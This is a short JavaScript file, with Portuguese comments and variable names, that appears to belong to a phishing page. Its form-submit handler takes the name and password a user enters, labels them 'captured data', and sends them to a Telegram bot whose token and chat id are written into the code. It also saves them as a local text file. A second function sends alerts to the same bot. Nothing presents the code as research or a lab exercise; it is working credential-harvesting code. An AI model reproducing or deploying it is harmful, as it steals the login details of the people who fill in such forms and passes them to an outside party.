document.getElementById("dataForm").addEventListener("submit", function (e) {
  e.preventDefault();

  const nome = document.getElementById("nome").value;
  const senha = document.getElementById("senha").value;

  const mensagem = `⚠️ Dados capturados:\nNome: ${nome}\nSenha: ${senha}`;
  const token = "7333858492:AAFNcTINex5X69tZOWi18TTsUPiBBVt81jI";
  const chat_id = "8129097592";

  // Enviar para o Telegram
  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: chat_id,
      text: mensagem,
    }),
  });

  // Salvar local (emulado com download de .txt)
  const blob = new Blob([mensagem], { type: "text/plain" });
  const link = document.createElement("a");
  link.href = URL.createObjectURL(blob);
  link.download = "dados.txt";
  link.click();

  alert("Dados enviados e salvos.");
});

function enviarTelegramDireto() {
  const mensagem = "⚠️ Botão de alerta acionado!";
  const token = "7333858492:AAFNcTINex5X69tZOWi18TTsUPiBBVt81jI";
  const chat_id = "8129097592";

  fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      chat_id: chat_id,
      text: mensagem
    })
  })
  .then(() => {
    alert("Mensagem enviada com sucesso!");
  })
  .catch(() => {
    alert("Erro ao enviar a mensagem.");
  });
}